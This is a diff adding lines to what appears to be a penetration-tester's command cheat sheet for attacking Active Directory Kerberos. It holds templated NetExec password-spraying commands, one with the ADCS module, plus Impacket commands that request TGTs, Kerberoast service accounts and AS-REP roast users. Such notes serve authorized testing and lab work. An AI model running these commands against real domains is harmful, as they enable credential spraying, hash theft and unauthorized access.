@@ -329,7 +329,9 @@ while read -r user; do finger "$user"@$TARGET; done < usernames
 
 [*] (88) Kerberos
 nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success -k
+nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords -k -M adcs
 
+impacket-getTGT -dc-ip $TARGET '$DOM'/'$USERNAME':'$PASSWORD'; export KRB5CCNAME="$USERNAME.ccache"; chmod 0600 "$USERNAME.ccache"
 impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -request
 impacket-GetNPUsers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -usersfile usernames
 impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -usersfile usernames
